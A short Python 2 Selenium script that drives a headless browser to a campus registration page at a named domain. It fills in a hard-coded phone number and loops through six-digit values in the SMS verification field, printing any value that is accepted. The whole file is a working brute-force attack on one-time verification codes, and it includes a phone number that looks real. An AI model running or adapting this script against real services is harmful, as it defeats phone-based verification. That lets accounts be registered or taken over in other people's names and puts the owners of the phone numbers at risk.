# -*- coding:utf-8 -*-
from selenium import webdriver
import time,re,sys

reload(sys) 
sys.setdefaultencoding('utf8')

if __name__ == '__main__':
	chrome_options = webdriver.ChromeOptions()
	chrome_options.add_argument("--headless")
	chrome_options.add_argument('--no-sandbox')
	chrome_options.add_argument("--disable-gpu")
	browser = webdriver.Chrome(chrome_options=chrome_options)
	browser.get("http://jjdbhwzp.com/campus/index.html")
	time.sleep(1)
	browser.find_element_by_id("baoming_btn").click()
	time.sleep(0.5)
	browser.find_element_by_id("weui-picker-confirm").click()
	time.sleep(0.5)
	browser.find_element_by_id("phone_1").send_keys("15846007767")
	for i in range(644690,644699):
		time.sleep(0.5)
		vcode = browser.find_elements_by_css_selector(".weui-input")[1]
		vcode.clear()
		vcode.send_keys("%06s"%i)
		time.sleep(0.5)
		browser.find_elements_by_css_selector(".weui-btn-full.weui-btn_primary")[1].click()
		try:
			time.sleep(0.5)
			browser.find_element_by_css_selector(".weui-dialog__btn.weui-dialog__btn_primary").click()
		except:
			print "%06s"%i
	browser.close()